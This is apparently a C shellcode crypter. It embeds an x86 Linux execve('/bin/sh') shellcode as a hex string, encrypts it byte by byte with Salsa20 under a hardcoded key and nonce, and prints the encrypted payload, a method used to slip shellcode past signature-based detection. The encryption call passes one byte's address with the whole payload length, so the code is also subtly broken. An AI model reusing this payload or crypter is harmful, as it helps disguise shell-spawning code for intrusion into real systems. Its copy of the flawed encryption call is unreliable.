#include <stdio.h>
#include <string.h>
#include "salsa20.h"

int main(int argc, char *argv[]) {
    char in[]= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
	char key[] = "qwertyuiolkjhgfd";
	char nonce[] = "wderftgy";
  	// Stream index
	uint32_t si = 0;
	int in_len = strlen(in);
	int count;
	printf("Dumping Salsa20 Encrypted Shellcode\n\n\"");
	for (count=0; count < in_len; count++) {
		uint8_t c = in[count];
    	// Encrypt a single character at a time
    	//                          key     128-bit key                 nonce  encrypt one byte
    	if (s20_crypt((uint8_t *) key, S20_KEYLEN_128, (uint8_t *) nonce, si++, &c, in_len) == S20_FAILURE)
      	    puts("Error: encryption failed");
		printf("\\x%02x", c);
    }
	printf("\"\n\n");
  return 0;
}
